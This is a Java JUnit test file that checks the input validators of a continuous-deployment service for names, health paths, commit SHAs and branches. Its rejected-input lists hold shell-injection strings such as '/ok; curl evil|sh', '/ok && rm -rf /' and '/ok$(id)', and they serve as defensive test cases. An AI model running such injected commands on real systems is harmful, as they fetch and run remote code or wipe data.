package eu.wohlben.qits.cd.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import eu.wohlben.qits.cd.error.BadRequestException;
import org.junit.jupiter.api.Test;

/**
 * The boundary validation of everything that reaches an argv or the container's health command.
 * Plain JUnit — nothing here needs a running application.
 */
class CdIdentifiersTest {

  @Test
  void namesAreDnsLabels() {
    assertEquals("some-epic", CdIdentifiers.requireName("some-epic", "environment name"));
    assertEquals("a", CdIdentifiers.requireName("a", "environment name"));
    for (String hostile :
        new String[] {
          null, "", "UPPER", "has space", "-leads", "trails-", "dot.dot", "a".repeat(64), "sh;rm"
        }) {
      assertThrows(
          BadRequestException.class,
          () -> CdIdentifiers.requireName(hostile, "environment name"),
          String.valueOf(hostile));
    }
  }

  @Test
  void healthPathsAreAbsoluteAndMetacharacterFree() {
    assertEquals("/q/health/ready", CdIdentifiers.requireHealthPath("/q/health/ready"));
    assertEquals("/healthz", CdIdentifiers.requireHealthPath("/healthz"));
    for (String hostile :
        new String[] {
          null, "", "healthz", "/ok; curl evil|sh", "/ok && rm -rf /", "/ok$(id)", "/ok`id`",
          "/ok health", "/ok\"", "/ok'"
        }) {
      assertThrows(
          BadRequestException.class,
          () -> CdIdentifiers.requireHealthPath(hostile),
          String.valueOf(hostile));
    }
  }

  @Test
  void shasAreHexObjectIds() {
    assertEquals("a".repeat(40), CdIdentifiers.requireSha("a".repeat(40)));
    assertEquals("1234abc", CdIdentifiers.requireSha("1234abc"));
    for (String hostile : new String[] {null, "", "latest", "HEAD", "a".repeat(65), "12345g7"}) {
      assertThrows(BadRequestException.class, () -> CdIdentifiers.requireSha(hostile));
    }
  }

  @Test
  void branchesArederivedFromNamesSafely() {
    assertEquals("epic/some-epic", CdIdentifiers.requireBranch("epic/some-epic"));
    for (String hostile : new String[] {null, "", "-x", "a..b", "a//b", "ends/", "x.lock"}) {
      assertThrows(BadRequestException.class, () -> CdIdentifiers.requireBranch(hostile));
    }
  }

  @Test
  void theImageReferenceConventionIsTheOneSpelled() {
    // Pins the exact shape a publisher has to tag: <registry>/<repository>/<application>:<sha>.
    assertEquals(
        "qits-artifacts:8080/qits/qits-gateway:" + "a".repeat(40),
        ImageRefs.imageRef("qits-artifacts:8080", "qits", "qits-gateway", "a".repeat(40)));
  }

  @Test
  void containerNamesCarryEnvironmentApplicationAndDeployment() {
    assertEquals(
        "qits-cd-some-epic-qits-gateway-0123abcd",
        DeployService.containerName("some-epic", "qits-gateway", "0123abcd-ffff-4000-8000-0000"));
  }
}
